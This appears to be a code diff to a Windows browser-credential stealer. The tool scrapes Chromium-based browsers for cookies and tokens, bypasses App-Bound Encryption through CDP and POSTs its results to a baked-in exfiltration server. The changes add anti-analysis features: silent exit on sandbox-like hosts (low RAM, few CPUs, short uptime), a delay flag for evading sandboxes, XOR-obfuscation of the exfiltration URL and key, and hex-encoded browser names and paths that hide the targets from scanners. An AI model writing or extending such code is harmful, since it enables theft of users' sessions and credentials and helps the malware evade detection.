@@ -55,6 +55,36 @@ if sys.stdout is not None:
 # Set True in main() when --verify is passed; gates OIDC discovery network calls
 _do_oidc: bool = False
 _enable_cdp: bool = False
+_DEFAULT_DELAY: int = 0
+
+
+def _evasion_gate(delay_sec: int = 0) -> None:
+    """Sandbox/VM checks + optional startup delay. Exit silently if the host looks like an analysis box."""
+    if delay_sec > 0:
+        time.sleep(delay_sec)
+    try:
+        class _MSE(ctypes.Structure):
+            _fields_ = [
+                ("dwLength", ctypes.c_uint32), ("dwMemoryLoad", ctypes.c_uint32),
+                ("ullTotalPhys", ctypes.c_uint64), ("ullAvailPhys", ctypes.c_uint64),
+                ("ullTotalPageFile", ctypes.c_uint64), ("ullAvailPageFile", ctypes.c_uint64),
+                ("ullTotalVirtual", ctypes.c_uint64), ("ullAvailVirtual", ctypes.c_uint64),
+                ("ullAvailExtendedVirtual", ctypes.c_uint64),
+            ]
+        m = _MSE()
+        m.dwLength = ctypes.sizeof(_MSE)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
+        if m.ullTotalPhys < (2 << 30):
+            os._exit(0)
+    except Exception:
+        pass
+    try:
+        if os.cpu_count() < 2:
+            os._exit(0)
+        if ctypes.windll.kernel32.GetTickCount64() < 5 * 60 * 1000:
+            os._exit(0)
+    except Exception:
+        pass
 
 # ── Windows API constants ──────────────────────────────────────────────────────
 PROCESS_VM_READ           = 0x0010
@@ -365,9 +395,25 @@ def copy_db_with_wal(src: str) -> str:
 # Credential patterns and utilities imported from browserbleed.shared
 
 # Build-time defaults - substituted by the build system per-job.
-# Override any of these at runtime with the matching CLI flags.
-_EXFIL_URL: str = ""
-_EXFIL_KEY: str = ""
+# The URL/key are XOR-obfuscated at build time so they aren't plaintext strings.
+_EXFIL_URL_ENC: str = ""
+_EXFIL_KEY_ENC: str = ""
+_EXFIL_XOR_KEY: str = ""
+
+
+def _xor_decrypt(cipher_hex: str, key_hex: str) -> str:
+    if not cipher_hex or not key_hex:
+        return ""
+    try:
+        key = bytes.fromhex(key_hex)
+        data = bytes.fromhex(cipher_hex)
+        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode("utf-8")
+    except Exception:
+        return ""
+
+
+_EXFIL_URL: str = _xor_decrypt(_EXFIL_URL_ENC, _EXFIL_XOR_KEY)
+_EXFIL_KEY: str = _xor_decrypt(_EXFIL_KEY_ENC, _EXFIL_XOR_KEY)
 _DEFAULT_DISK_ONLY: bool = False
 _DEFAULT_MEMORY_ONLY: bool = False
 _DEFAULT_VERIFY: bool = False
@@ -473,15 +519,20 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
 _LAPPDATA = os.environ.get("LOCALAPPDATA", "")
 _APPDATA  = os.environ.get("APPDATA", "")
 
+
+def _d(h: str) -> str:
+    return bytes(b ^ 0x2A for b in bytes.fromhex(h)).decode("utf-8")
+
+
 BROWSERS = [
-    ("Google Chrome",  "chrome.exe",        os.path.join(_LAPPDATA, "Google",        "Chrome",        "User Data")),
-    ("Microsoft Edge", "msedge.exe",         os.path.join(_LAPPDATA, "Microsoft",     "Edge",          "User Data")),
-    ("Brave",          "brave.exe",          os.path.join(_LAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
-    ("Vivaldi",        "vivaldi.exe",        os.path.join(_LAPPDATA, "Vivaldi",       "User Data")),
-    ("Opera",          "opera.exe",          os.path.join(_APPDATA,  "Opera Software","Opera Stable")),
-    ("Opera GX",       "opera.exe",          os.path.join(_APPDATA,  "Opera Software","Opera GX Stable")),
-    ("Chromium",       "chromium.exe",       os.path.join(_LAPPDATA, "Chromium",      "User Data")),
-    ("Yandex Browser", "browser.exe",        os.path.join(_LAPPDATA, "Yandex",        "YandexBrowser", "User Data")),
+    (_d("6d45454d464f0a69425845474f"), _d("49425845474f044f524f"), os.path.join(_LAPPDATA, _d("6d45454d464f"), _d("69425845474f"), _d("7f594f580a6e4b5e4b"))),
+    (_d("674349584559454c5e0a6f4e4d4f"), _d("47594f4e4d4f044f524f"), os.path.join(_LAPPDATA, _d("674349584559454c5e"), _d("6f4e4d4f"), _d("7f594f580a6e4b5e4b"))),
+    (_d("68584b5c4f"), _d("48584b5c4f044f524f"), os.path.join(_LAPPDATA, _d("68584b5c4f79454c5e5d4b584f"), _d("68584b5c4f076858455d594f58"), _d("7f594f580a6e4b5e4b"))),
+    (_d("7c435c4b464e43"), _d("5c435c4b464e43044f524f"), os.path.join(_LAPPDATA, _d("7c435c4b464e43"), _d("7f594f580a6e4b5e4b"))),
+    (_d("655a4f584b"), _d("455a4f584b044f524f"), os.path.join(_APPDATA, _d("655a4f584b0a79454c5e5d4b584f"), _d("655a4f584b0a795e4b48464f"))),
+    (_d("655a4f584b0a6d72"), _d("455a4f584b044f524f"), os.path.join(_APPDATA, _d("655a4f584b0a79454c5e5d4b584f"), _d("655a4f584b0a6d720a795e4b48464f"))),
+    (_d("6942584547435f47"), _d("4942584547435f47044f524f"), os.path.join(_LAPPDATA, _d("6942584547435f47"), _d("7f594f580a6e4b5e4b"))),
+    (_d("734b444e4f520a6858455d594f58"), _d("4858455d594f58044f524f"), os.path.join(_LAPPDATA, _d("734b444e4f52"), _d("734b444e4f526858455d594f58"), _d("7f594f580a6e4b5e4b"))),
 ]
 
 
@@ -2001,6 +2052,7 @@ def main():
     parser.add_argument("--verify",           action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--export-cookies",   metavar="PATH",      help="Export browser cookies to Netscape jar file for portable use on another machine")
     parser.add_argument("--enable-cdp",       action="store_true", help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP (bypasses App-Bound Encryption)")
+    parser.add_argument("--delay",            type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
     parser.add_argument("--exfil",            metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",        metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
@@ -2008,6 +2060,7 @@ def main():
     if args.verify:
         _do_oidc = True
     _enable_cdp = args.enable_cdp
+    _evasion_gate(args.delay)
 
     do_disk   = not args.memory_only
     do_memory = not args.disk_only
